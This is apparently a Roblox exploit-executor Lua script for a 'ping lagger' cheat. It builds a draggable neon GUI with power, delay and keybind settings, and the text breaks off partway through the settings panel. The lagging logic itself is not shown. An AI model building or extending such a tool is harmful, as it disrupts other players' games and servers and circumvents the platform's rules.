-- Viper Ping Lagger + Auto Brainrot
-- PC + Controller keybind | Customizable | Auto-save | Auto Brainrot Detection

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "ViperPingLagger_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonR2",
    autoBrainrot  = true,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoBrainrot  = DEFAULT_CFG.autoBrainrot,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot  = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false
local toggleSound      = nil

-- ══════════════════════════════════════════════════════════════════════
-- NEUE FARBEN - CYBERPUNK / NEON THEME
-- ══════════════════════════════════════════════════════════════════════
local C = {
    bg      = Color3.fromRGB(8, 6, 20),
    panel   = Color3.fromRGB(14, 10, 30),
    card    = Color3.fromRGB(20, 14, 40),
    primary = Color3.fromRGB(0, 200, 255),
    primary2= Color3.fromRGB(0, 150, 255),
    primary3= Color3.fromRGB(100, 220, 255),
    glow    = Color3.fromRGB(0, 180, 255),
    white   = Color3.fromRGB(240, 245, 255),
    dim     = Color3.fromRGB(150, 180, 220),
    green   = Color3.fromRGB(0, 255, 200),
    yellow  = Color3.fromRGB(255, 220, 60),
    red     = Color3.fromRGB(255, 80, 120),
    waiting = Color3.fromRGB(255, 190, 50),
    inputBg = Color3.fromRGB(10, 8, 25),
    accent  = Color3.fromRGB(255, 0, 180),
    accent2 = Color3.fromRGB(200, 0, 255),
}

local T = {
    bg      = 0.25,
    panel   = 0.20,
    card    = 0.25,
    header  = 0.10,
    inputBg = 0.15,
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "ViperPingLaggerGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "ViperPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function applyGradient(parent, c1, c2, rotation)
    local g = Instance.new("UIGradient", parent)
    g.Color    = ColorSequence.new({ ColorSequenceKeypoint.new(0,c1), ColorSequenceKeypoint.new(1,c2) })
    g.Rotation = rotation or 135
    return g
end

local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- MAIN WINDOW - CYBERPUNK STYLE
-- ══════════════════════════════════════════════════════════════════════
local MAIN_W, MAIN_H = 180, 120

local mainFrame = Instance.new("Frame")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, MAIN_W, 0, MAIN_H)
mainFrame.Position         = UDim2.new(0.5, -MAIN_W/2, 0.5, -MAIN_H/2)
mainFrame.BackgroundColor3 = C.bg
mainFrame.BackgroundTransparency = T.bg
mainFrame.BorderSizePixel  = 0
mainFrame.Active           = true
mainFrame.ClipsDescendants = false
mainFrame.Parent           = screen
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)
applyGradient(mainFrame, C.bg, Color3.fromRGB(12, 6, 25), 160)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color        = C.primary
mainStroke.Thickness    = 2
mainStroke.Transparency = 0.3

makeDraggable(mainFrame)

-- Header
local header = Instance.new("Frame", mainFrame)
header.Size             = UDim2.new(1,0,0,36)
header.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
header.BackgroundTransparency = 0.15
header.BorderSizePixel  = 0
header.ZIndex           = 2
Instance.new("UICorner", header).CornerRadius = UDim.new(0,16)
applyGradient(header, C.primary, C.accent2, 135)

local titleLbl = Instance.new("TextLabel", header)
titleLbl.Size               = UDim2.new(1,-60,1,0)
titleLbl.Position           = UDim2.new(0,12,0,0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text               = "VIPER"
titleLbl.TextColor3         = C.white
titleLbl.Font               = Enum.Font.GothamBlack
titleLbl.TextSize           = 14
titleLbl.TextXAlignment     = Enum.TextXAlignment.Left
titleLbl.ZIndex             = 3

local subtitleLbl = Instance.new("TextLabel", header)
subtitleLbl.Size               = UDim2.new(1,-60,1,0)
subtitleLbl.Position           = UDim2.new(0,12,0,14)
subtitleLbl.BackgroundTransparency = 1
subtitleLbl.Text               = "PING LAGGER"
subtitleLbl.TextColor3         = C.primary3
subtitleLbl.Font               = Enum.Font.GothamBold
subtitleLbl.TextSize           = 8
subtitleLbl.TextXAlignment     = Enum.TextXAlignment.Left
subtitleLbl.ZIndex             = 3

-- Settings button
local settingsBtn = Instance.new("TextButton", header)
settingsBtn.Size             = UDim2.new(0,28,0,28)
settingsBtn.Position         = UDim2.new(1,-34,0.5,-14)
settingsBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
settingsBtn.BackgroundTransparency = 0.2
settingsBtn.BorderSizePixel  = 0
settingsBtn.AutoButtonColor  = false
settingsBtn.Text             = "⚙"
settingsBtn.TextColor3       = C.white
settingsBtn.Font             = Enum.Font.GothamBlack
settingsBtn.TextSize         = 16
settingsBtn.ZIndex           = 23
Instance.new("UICorner", settingsBtn).CornerRadius = UDim.new(1,0)
settingsBtn.MouseEnter:Connect(function() 
    tw(settingsBtn,{BackgroundColor3=C.primary},0.1) 
end)
settingsBtn.MouseLeave:Connect(function() 
    tw(settingsBtn,{BackgroundColor3=Color3.fromRGB(0,150,255)},0.1) 
end)

-- Status indicator
local statusCircle = Instance.new("Frame", mainFrame)
statusCircle.Size             = UDim2.new(0,14,0,14)
statusCircle.Position         = UDim2.new(0.5,-7,0,50)
statusCircle.BackgroundColor3 = C.red
statusCircle.BorderSizePixel  = 0
statusCircle.ZIndex           = 4
Instance.new("UICorner", statusCircle).CornerRadius = UDim.new(1,0)

local statusGlow = Instance.new("Frame", statusCircle)
statusGlow.Size             = UDim2.new(1,8,1,8)
statusGlow.Position         = UDim2.new(-0.5,-4,-0.5,-4)
statusGlow.BackgroundColor3 = C.red
statusGlow.BackgroundTransparency = 0.7
statusGlow.BorderSizePixel  = 0
statusGlow.ZIndex           = 3
Instance.new("UICorner", statusGlow).CornerRadius = UDim.new(1,0)

local statusText = Instance.new("TextLabel", mainFrame)
statusText.Size               = UDim2.new(1,0,0,14)
statusText.Position           = UDim2.new(0,0,0,68)
statusText.BackgroundTransparency = 1
statusText.Text               = "OFFLINE"
statusText.TextColor3         = C.red
statusText.Font               = Enum.Font.GothamBlack
statusText.TextSize           = 8
statusText.ZIndex             = 4

-- Activate Button
local activateBtn = Instance.new("TextButton", mainFrame)
activateBtn.Size             = UDim2.new(0,60,0,60)
activateBtn.Position         = UDim2.new(0.5,-30,0,88)
activateBtn.BackgroundColor3 = C.primary
activateBtn.BackgroundTransparency = 0.15
activateBtn.BorderSizePixel  = 0
activateBtn.AutoButtonColor  = false
activateBtn.Text             = "▶"
activateBtn.TextColor3       = C.white
activateBtn.Font             = Enum.Font.GothamBlack
activateBtn.TextSize         = 28
activateBtn.ZIndex           = 5
Instance.new("UICorner", activateBtn).CornerRadius = UDim.new(1,0)

local btnStroke = Instance.new("UIStroke", activateBtn)
btnStroke.Color        = C.primary
btnStroke.Thickness    = 2
btnStroke.Transparency = 0.3

-- ── Toggle-Sound (zuverlässig & mit Fallback) ──────────────────
-- Haupt-Sound (Sci-Fi Zap)
local function createToggleSound()
    local s = Instance.new("Sound")
    s.Name = "ToggleSound"
    s.SoundId = "rbxassetid://9120381533"  -- Kurzer Zap
    s.Volume = 1
    s.Parent = screen  -- Parent im ScreenGui (stabiler)
    return s
end

toggleSound = createToggleSound()

-- Fallback-Sound (falls der erste nicht lädt)
local fallbackSound = Instance.new("Sound")
fallbackSound.Name = "FallbackSound"
fallbackSound.SoundId = "rbxassetid://1839987946"  -- Klick
fallbackSound.Volume = 1
fallbackSound.Parent = screen

activateBtn.MouseEnter:Connect(function()
    tw(activateBtn,{BackgroundColor3=Color3.fromRGB(0,200,255)},0.1)
    tw(btnStroke,{Transparency=0},0.1)
end)
activateBtn.MouseLeave:Connect(function()
    if not active then
        tw(activateBtn,{BackgroundColor3=Color3.fromRGB(0,200,255)},0.1)
        tw(btnStroke,{Transparency=0.3},0.1)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- ⚡ VIPER POWER SURGE ANIMATION (MODERN & FRESH)
-- ══════════════════════════════════════════════════════════════════════
local function playToggleSound()
    pcall(function()
        if toggleSound then
            toggleSound:Stop()
            toggleSound.TimePosition = 0
            toggleSound:Play()
        end
    end)
    -- Falls Haupt-Sound nicht abspielt, versuche Fallback nach kurzer Verzögerung
    task.delay(0.05, function()
        pcall(function()
            if fallbackSound and not fallbackSound.IsPlaying then
                fallbackSound:Stop()
                fallbackSound.TimePosition = 0
                fallbackSound:Play()
            end
        end)
    end)
end

local function powerSurge(state)
    local color = state and C.green or C.red
    local glowColor = state and Color3.fromRGB(0, 255, 200) or Color3.fromRGB(255, 80, 120)

    -- Sound abspielen
    playToggleSound()

    -- Button speichern
    local normalSize = UDim2.new(0, 60, 0, 60)
    local normalPos  = UDim2.new(0.5, -30, 0, 88)

    -- ── Phase 1: Aufladen (Puls) ────────────────────────────────────
    activateBtn.Size = UDim2.new(0, 60, 0, 60)
    activateBtn.Position = normalPos

    tw(activateBtn, {
        Size = UDim2.new(0, 76, 0, 76),
        Position = UDim2.new(0.5, -38, 0, 80),
        BackgroundColor3 = glowColor,
        BackgroundTransparency = 0
    }, 0.07)

    mainStroke.Color = glowColor
    mainStroke.Thickness = 6
    mainStroke.Transparency = 0

    btnStroke.Color = glowColor
    btnStroke.Thickness = 6
    btnStroke.Transparency = 0

    statusGlow.BackgroundColor3 = glowColor
    statusGlow.BackgroundTransparency = 0.1
    statusGlow.Size = UDim2.new(1, 32, 1, 32)
    statusGlow.Position = UDim2.new(-0.5, -16, -0.5, -16)

    -- ── Phase 2: Zurückfedern (kleinerer Puls) ────────────────────
    task.delay(0.07, function()
        if not activateBtn or not activateBtn.Parent then return end
        tw(activateBtn, {
            Size = UDim2.new(0, 64, 0, 64),
            Position = UDim2.new(0.5, -32, 0, 86),
            BackgroundColor3 = color,
            BackgroundTransparency = 0.05
        }, 0.06)
    end)

    -- ── Phase 3: Entladungs-Blitz (kurz & intensiv) ──────────────
    task.delay(0.13, function()
        if not activateBtn or not activateBtn.Parent then return end
        tw(activateBtn, {
            BackgroundColor3 = Color3.fromRGB(255, 255, 255),
            BackgroundTransparency = 0.3
        }, 0.03)

        mainStroke.Color = Color3.fromRGB(255, 255, 255)
        mainStroke.Thickness = 8
        mainStroke.Transparency = 0

        btnStroke.Color = Color3.fromRGB(255, 255, 255)
        btnStroke.Thickness = 8
        btnStroke.Transparency = 0

        statusGlow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        statusGlow.BackgroundTransparency = 0.4
        statusGlow.Size = UDim2.new(1, 40, 1, 40)
        statusGlow.Position = UDim2.new(-0.5, -20, -0.5, -20)

        mainFrame.BackgroundColor3 = Color3.fromRGB(30, 20, 60)
        tw(mainFrame, {
            BackgroundColor3 = C.bg
        }, 0.2)
    end)

    -- ── Phase 4: Sanftes Ausklingen (Nachglühen) ──────────────────
    task.delay(0.16, function()
        if not activateBtn or not activateBtn.Parent then return end
        tw(activateBtn, {
            Size = normalSize,
            Position = normalPos,
            BackgroundColor3 = state and C.green or C.primary,
            BackgroundTransparency = 0.15
        }, 0.15)

        tw(mainStroke, {
            Thickness = 2,
            Transparency = 0.25,
            Color = state and C.green or C.primary
        }, 0.2)

        tw(btnStroke, {
            Thickness = 2,
            Transparency = 0.1,
            Color = state and C.green or C.primary
        }, 0.2)

        tw(statusGlow, {
            Size = UDim2.new(1, 8, 1, 8),
            Position = UDim2.new(-0.5, -4, -0.5, -4),
            BackgroundTransparency = 0.7,
            BackgroundColor3 = state and C.green or C.red
        }, 0.3)

        statusText.TextTransparency = 0
        statusText.TextSize = 10
        tw(statusText, {
            TextSize = 8
        }, 0.2)
    end)

    -- ── Extra: Status-Kreis-Pulse ────────────────────────────────
    if state then
        tw(statusCircle, {
            Size = UDim2.new(0, 18, 0, 18),
            Position = UDim2.new(0.5, -9, 0, 48)
        }, 0.1)
        task.delay(0.15, function()
            if statusCircle and statusCircle.Parent then
                tw(statusCircle, {
                    Size = UDim2.new(0, 14, 0, 14),
                    Position = UDim2.new(0.5, -7, 0, 50)
                }, 0.15)
            end
        end)
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- UPDATE MAIN UI
-- ══════════════════════════════════════════════════════════════════════
local function updateMainUI(state)
    if state then
        statusCircle.BackgroundColor3 = C.green
        statusGlow.BackgroundColor3 = C.green

        statusText.Text = "ONLINE"
        statusText.TextColor3 = C.green

        activateBtn.Text = "■"
        activateBtn.TextColor3 = C.green

        btnStroke.Color = C.green
        mainStroke.Color = C.green

        tw(statusCircle, {
            BackgroundColor3 = C.green
        }, 0.2)

        tw(statusGlow, {
            BackgroundColor3 = C.green
        }, 0.2)

        powerSurge(true)

    else
        statusCircle.BackgroundColor3 = C.red
        statusGlow.BackgroundColor3 = C.red

        statusText.Text = "OFFLINE"
        statusText.TextColor3 = C.red

        activateBtn.Text = "▶"
        activateBtn.TextColor3 = C.white

        btnStroke.Color = C.primary
        mainStroke.Color = C.primary

        tw(statusCircle, {
            BackgroundColor3 = C.red
        }, 0.2)

        tw(statusGlow, {
            BackgroundColor3 = C.red
        }, 0.2)

        powerSurge(false)
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- SETTINGS PANEL (unverändert)
-- ══════════════════════════════════════════════════════════════════════
local SET_W, SET_H = 380, 280

local settingsFrame = Instance.new("Frame")
settingsFrame.Name             = "SettingsPanel"
settingsFrame.Size             = UDim2.new(0,SET_W,0,SET_H)
settingsFrame.Position         = UDim2.new(0.5,-SET_W/2,0.5,60)
settingsFrame.BackgroundColor3 = C.panel
settingsFrame.BackgroundTransparency = T.panel
settingsFrame.BorderSizePixel  = 0
settingsFrame.Active           = true
settingsFrame.ClipsDescendants = true
settingsFrame.Visible          = false
settingsFrame.ZIndex           = 20
settingsFrame.Parent           = screen
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0,16)
applyGradient(settingsFrame, C.panel, Color3.fromRGB(10, 4, 22), 160)

local setStroke = Instance.new("UIStroke", settingsFrame)
setStroke.Color        = C.primary
setStroke.Thickness    = 1.5
setStroke.Transparency = 0.25

makeDraggable(settingsFrame)

-- Settings header
local setHeader = Instance.new("Frame", settingsFrame)
setHeader.Size             = UDim2.new(1,0,0,36)
setHeader.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
setHeader.BackgroundTransparency = 0.12
setHeader.BorderSizePixel  = 0
setHeader.ZIndex           = 21
Instance.new("UICorner", setHeader).CornerRadius = UDim.new(0,16)
applyGradient(setHeader, C.primary, C.accent2, 135)

local setTitle = Instance.new("TextLabel", setHeader)
setTitle.Size               = UDim2.new(1,-80,1,0)
setTitle.Position           = UDim2.new(0,14,0,0)
setTitle.BackgroundTransparency = 1
setTitle.Text               = "⚡ SETTINGS"
setTitle.TextColor3         = C.white
setTitle.Font               = Enum.Font.GothamBlack
setTitle.TextSize           = 12
setTitle.TextXAlignment     = Enum.TextXAlignment.Left
setTitle.ZIndex             = 22

local setCloseBtn = Instance.new("TextButton", setHeader)
setCloseBtn.Size             = UDim2.new(0,28,0,28)
setCloseBtn.Position         = UDim2.new(1,-34,0.5,-14)
setCloseBtn.BackgroundColor3 = Color3.fromRGB(255,80,120)
setCloseBtn.BackgroundTransparency = 0.15
setCloseBtn.BorderSizePixel  = 0
setCloseBtn.AutoButtonColor  = false
setCloseBtn.Text             = "✕"
setCloseBtn.TextColor3       = C.white
setCloseBtn.Font             = Enum.Font.GothamBlack
setCloseBtn.TextSize         = 12
setCloseBtn.ZIndex           = 23
Instance.new("UICorner", setCloseBtn).CornerRadius = UDim.new(1,0)
setCloseBtn.MouseEnter:Connect(function() tw(setCloseBtn,{BackgroundTransparency=0},0.1) end)
setCloseBtn.MouseLeave:Connect(function() tw(setCloseBtn,{BackgroundTransparency=0.15},0.1) end)

-- LEFT COLUMN
local leftCol = Instance.new("Frame", settingsFrame)
leftCol.Size             = UDim2.new(0.48, -4, 1, -44)
leftCol.Position         = UDim2.new(0, 8, 0, 40)
leftCol.BackgroundTransparency = 1
leftCol.BorderSizePixel  = 0
leftCol.ZIndex           = 21
leftCol.ClipsDescendants = true

-- RIGHT COLUMN
local rightCol = Instance.new("Frame", settingsFrame)
rightCol.Size             = UDim2.new(0.48, -4, 1, -44)
rightCol.Position         = UDim2.new(0.52, 0, 0, 40)
rightCol.BackgroundTransparency = 1
rightCol.BorderSizePixel  = 0
rightCol.ZIndex           = 21
rightCol.ClipsDescendants = true

-- ── LEFT COLUMN ──────────────────────────────────────────────
local function createNeonRow(parent, yPos, labelText)
    local row = Instance.new("Frame", parent)
    row.Size             = UDim2.new(1,-4,0,34)
    row.Position         = UDim2.new(0,2,0,yPos)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = T.card
    row.BorderSizePixel  = 0
    row.ZIndex           = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,8)
    local rs = Instance.new("UIStroke",row); rs.Color=C.primary; rs.Thickness=1; rs.Transparency=0.4

    local lbl = Instance.new("TextLabel", row)
    lbl.Size               = UDim2.new(0.5,0,1,0)
    lbl.Position           = UDim2.new(0,10,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text               = labelText
    lbl.TextColor3         = C.primary3
    lbl.Font               = Enum.Font.GothamBold
    lbl.TextSize           = 10
    lbl.TextXAlignment     = Enum.TextXAlignment.Left
    lbl.ZIndex             = 23
    
    return row, lbl
end

-- Power Row
local powerRow, powerLbl = createNeonRow(leftCol, 4, "⚡ POWER")
local powerBox = Instance.new("TextBox", powerRow)
powerBox.Size               = UDim2.new(0,80,0,24)
powerBox.Position           = UDim2.new(1,-90,0.5,-12)
powerBox.BackgroundColor3   = C.inputBg
powerBox.BackgroundTransparency = T.inputBg
powerBox.BorderSizePixel    = 0
powerBox.Text               = tostring(cfg.power)
powerBox.TextColor3         = C.primary3
powerBox.Font               = Enum.Font.GothamBold
powerBox.TextSize           = 11
powerBox.ClearTextOnFocus   = false
powerBox.ZIndex             = 23
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0,6)
local pbs = Instance.new("UIStroke",powerBox); pbs.Color=C.primary; pbs.Thickness=1; pbs.Transparency=0.5

powerBox.Focused:Connect(function() tw(pbs,{Color=C.primary,Transparency=0},0.12) end)
powerBox.FocusLost:Connect(function()
    tw(pbs,{Color=C.primary,Transparency=0.5},0.12)
    local n = tonumber(powerBox.Text)
    if n then
        cfg.power = math.max(1, n)
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

-- Delay Row
local delayRow, delayLbl = createNeonRow(leftCol, 44, "⏱ DELAY")
local delayBox = Instance.new("TextBox", delayRow)
delayBox.Size               = UDim2.new(0,80,0,24)
delayBox.Position           = UDim2.new(1,-90,0.5,-12)
delayBox.BackgroundColor3   = C.inputBg
delayBox.BackgroundTransparency = T.inputBg
delayBox.BorderSizePixel    = 0
delayBox.Text               = tostring(cfg.interval)
delayBox.TextColor3         = C.primary3
delayBox.Font               = Enum.Font.GothamBold
delayBox.TextSize           = 11
delayBox.ClearTextOnFocus   = false
delayBox.ZIndex             = 23
Instance.new("UICorner", delayBox).CornerRadius = UDim.new(0,6)
local dbs = Instance.new("UIStroke",delayBox); dbs.Color=C.primary; dbs.Thickness=1; dbs.Transparency=0.5

delayBox.Focused:Connect(function() tw(dbs,{Color=C.primary,Transparency=0},0.12) end)
delayBox.FocusLost:Connect(function()
    tw(dbs,{Color=C.primary,Transparency=0.5},0.12)
    local n = tonumber(delayBox.Text)
    if n then
        cfg.interval = math.max(0.01, n)
        delayBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

-- Auto Brainrot Row
local brainRow, brainLbl = createNeonRow(leftCol, 84, "🧠 AUTO BRAINROT")
local brainToggle = Instance.new("TextButton", brainRow)
brainToggle.Size             = UDim2.new(0,50,0,24)
brainToggle.Position         = UDim2.new(1,-60,0.5,-12)
brainToggle.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40, 10, 30)
brainToggle.BorderSizePixel  = 0
brainToggle.AutoButtonColor  = false
brainToggle.Text             = cfg.autoBrainrot and "ON" or "OFF"
brainToggle.TextColor3       = C.white
brainToggle.Font             = Enum.Font.GothamBlack
brainToggle.TextSize         = 9
brainToggle.ZIndex           = 23
Instance.new("UICorner", brainToggle).CornerRadius = UDim.new(1,0)
local bts = Instance.new("UIStroke", brainToggle); bts.Color=C.primary; bts.Thickness=1; bts.Transparency=0.5

brainToggle.MouseButton1Click:Connect(function()
    cfg.autoBrainrot = not cfg.autoBrainrot
    brainToggle.Text = cfg.autoBrainrot and "ON" or "OFF"
    tw(brainToggle, {BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(40,10,30)}, 0.15)
    saveConfig()
end)

-- ── RIGHT COLUMN ─────────────────────────────────────────────
local kbLabel = Instance.new("TextLabel", rightCol)
kbLabel.Size               = UDim2.new(1,-8,0,16)
kbLabel.Position           = UDim2.new(0,4,0,4)
kbLabel.BackgroundTransparency = 1
kbLabel.Text               = "⌨ KEYBINDS"
kbLabel.TextColor3         = C.primary
kbLabel.Font               = Enum.Font.GothamBlack
kbLabel.TextSize           = 9
kbLabel.TextXAlignment     = Enum.TextXAlignment.Left
kbLabel.ZIndex             = 22

-- Keyboard Row
local kbRow = Instance.new("Frame", rightCol)
kbRow.Size             = UDim2.new(1,-4,0,34)
kbRow.Position         = UDim2.new(0,2,0,24)
kbRow.BackgroundColor3 = C.card
kbRow.BackgroundTransparency = T.card
kbRow.BorderSizePixel  = 0
kbRow.ZIndex           = 22
Instance.new("UICorner", kbRow).CornerRadius = UDim.new(0,8)
local krs = Instance.new("UIStroke",kbRow); krs.Color=C.primary; krs.Thickness=1; krs.Transparency=0.4

local kbLabel2 = Instance.new("TextLabel", kbRow)
kbLabel2.Size               = UDim2.new(0.4,0,1,0)
kbLabel2.Position           = UDim2.new(0,10,0,0)
kbLabel2.BackgroundTransparency = 1
kbLabel2.Text               = "Keyboard"
kbLabel2.TextColor3         = C.primary3
kbLabel2.Font               = Enum.Font.GothamBold
kbLabel2.TextSize           = 10
kbLabel2.TextXAlignment     = Enum.TextXAlignment.Left
kbLabel2.ZIndex             = 23

local kbBindBtn = Instance.new("TextButton", kbRow)
kbBindBtn.Size             = UDim2.new(0,72,0,24)
kbBindBtn.Position         = UDim2.new(1,-88,0.5,-12)
kbBindBtn.BackgroundColor3 = C.inputBg
kbBindBtn.BackgroundTransparency = T.inputBg
kbBindBtn.BorderSizePixel  = 0
kbBindBtn.AutoButtonColor  = false
kbBindBtn.Font             = Enum.Font.GothamBold
kbBindBtn.TextSize         = 9
kbBindBtn.TextColor3       = C.primary3
kbBindBtn.ZIndex           = 23
kbBindBtn.Text             = cfg.keybindKb
Instance.new("UICorner", kbBindBtn).CornerRadius = UDim.new(0,6)
local kbs = Instance.new("UIStroke",kbBindBtn); kbs.Color=C.primary; kbs.Thickness=1; kbs.Transparency=0.5

kbBindBtn.MouseEnter:Connect(function() tw(kbs,{Color=C.primary,Transparency=0},0.1) end)
kbBindBtn.MouseLeave:Connect(function() tw(kbs,{Color=C.primary,Transparency=0.5},0.1) end)

kbBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "kb") and nil or "kb"
    updateKbLabels()
end)

local kbClearBtn = Instance.new("TextButton", kbRow)
kbClearBtn.Size             = UDim2.new(0,24,0,24)
kbClearBtn.Position         = UDim2.new(1,-28,0.5,-12)
kbClearBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 20)
kbClearBtn.BackgroundTransparency = T.inputBg
kbClearBtn.BorderSizePixel  = 0
kbClearBtn.AutoButtonColor  = false
kbClearBtn.Text             = "✕"
kbClearBtn.TextColor3       = C.red
kbClearBtn.Font             = Enum.Font.GothamBlack
kbClearBtn.TextSize         = 10
kbClearBtn.ZIndex           = 23
Instance.new("UICorner", kbClearBtn).CornerRadius = UDim.new(0,6)
local kcs = Instance.new("UIStroke",kbClearBtn); kcs.Color=C.red; kcs.Thickness=1; kcs.Transparency=0.5

kbClearBtn.MouseEnter:Connect(function() tw(kcs,{Transparency=0},0.1) end)
kbClearBtn.MouseLeave:Connect(function() tw(kcs,{Transparency=0.5},0.1) end)
kbClearBtn.MouseButton1Click:Connect(function()
    if listeningFor == "kb" then listeningFor = nil end
    cfg.keybindKb = "None"
    updateKbLabels()
    saveConfig()
end)

-- Controller Row
local gpRow = Instance.new("Frame", rightCol)
gpRow.Size             = UDim2.new(1,-4,0,34)
gpRow.Position         = UDim2.new(0,2,0,64)
gpRow.BackgroundColor3 = C.card
gpRow.BackgroundTransparency = T.card
gpRow.BorderSizePixel  = 0
gpRow.ZIndex           = 22
Instance.new("UICorner", gpRow).CornerRadius = UDim.new(0,8)
local grs = Instance.new("UIStroke",gpRow); grs.Color=C.primary; grs.Thickness=1; grs.Transparency=0.4

local gpLabel = Instance.new("TextLabel", gpRow)
gpLabel.Size               = UDim2.new(0.4,0,1,0)
gpLabel.Position           = UDim2.new(0,10,0,0)
gpLabel.BackgroundTransparency = 1
gpLabel.Text               = "Controller"
gpLabel.TextColor3         = C.primary3
gpLabel.Font               = Enum.Font.GothamBold
gpLabel.TextSize           = 10
gpLabel.TextXAlignment     = Enum.TextXAlignment.Left
gpLabel.ZIndex             = 23

local gpBindBtn = Instance.new("TextButton", gpRow)
gpBindBtn.Size             = UDim2.new(0,72,0,24)
gpBindBtn.Position         = UDim2.new(1,-88,0.5,-12)
gpBindBtn.BackgroundColor3 = C.inputBg
gpBindBtn.BackgroundTransparency = T.inputBg
gpBindBtn.BorderSizePixel  = 0
gpBindBtn.AutoButtonColor  = false
gpBindBtn.Font             = Enum.Font.GothamBold
gpBindBtn.TextSize         = 9
gpBindBtn.TextColor3       = C.primary3
gpBindBtn.ZIndex           = 23
gpBindBtn.Text             = cfg.keybindGp
Instance.new("UICorner", gpBindBtn).CornerRadius = UDim.new(0,6)
local gps = Instance.new("UIStroke",gpBindBtn); gps.Color=C.primary; gps.Thickness=1; gps.Transparency=0.5

gpBindBtn.MouseEnter:Connect(function() tw(gps,{Color=C.primary,Transparency=0},0.1) end)
gpBindBtn.MouseLeave:Connect(function() tw(gps,{Color=C.primary,Transparency=0.5},0.1) end)

gpBindBtn.MouseButton1Click:Connect(function()
    listeningFor = (listeningFor == "gp") and nil or "gp"
    updateKbLabels()
end)

local gpClearBtn = Instance.new("TextButton", gpRow)
gpClearBtn.Size             = UDim2.new(0,24,0,24)
gpClearBtn.Position         = UDim2.new(1,-28,0.5,-12)
gpClearBtn.BackgroundColor3 = Color3.fromRGB(40, 10, 20)
gpClearBtn.BackgroundTransparency = T.inputBg
gpClearBtn.BorderSizePixel  = 0
